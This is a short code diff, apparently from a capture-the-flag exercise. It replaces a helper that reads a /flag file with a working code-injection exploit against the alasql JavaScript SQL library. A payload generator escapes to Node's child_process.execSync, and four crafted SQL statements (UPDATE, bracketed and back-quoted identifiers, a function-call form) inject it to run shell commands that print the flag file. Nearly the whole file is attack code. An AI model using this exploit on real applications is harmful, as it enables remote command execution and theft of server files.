@@ -1,20 +1,20 @@
-const fs = require('fs');
 const alasql = require('alasql');
 
-// getFlagContent 함수를 fs 모듈을 통해 직접 정의
-function getFlagContent() {
-    try {
-        const data = fs.readFileSync('/flag', 'utf-8');
-        return data;  // 파일 내용을 반환
-    } catch (err) {
-        console.error("Error reading the /flag file:", err);
-        return null;  // 오류 발생 시 null 반환
-    }
-}
+const genPayload = command => `
+new Function(
+    'return this.process.mainModule.require'
+)()('child_process').execSync(${JSON.stringify(command)})
+`;
 
-// getFlagContent를 alasql.fn에 등록
-alasql.fn.getFlagContent = getFlagContent;
 
-// alasql에서 함수 호출 테스트
-const result = alasql('SELECT VALUE getFlagContent()');
-console.log("Flag Content:", result);
+res = alasql(
+    // Initialize the database
+    'CREATE table i_am_a_table;' +
+    `INSERT INTO i_am_a_table VALUES (1337);` +
+
+    // Code injection in four different ways
+    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42;` +
+    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(/flag)")}+'];` +
+    `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(/flag)")}+'\` from i_am_a_table where 1;` +
+    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
+);
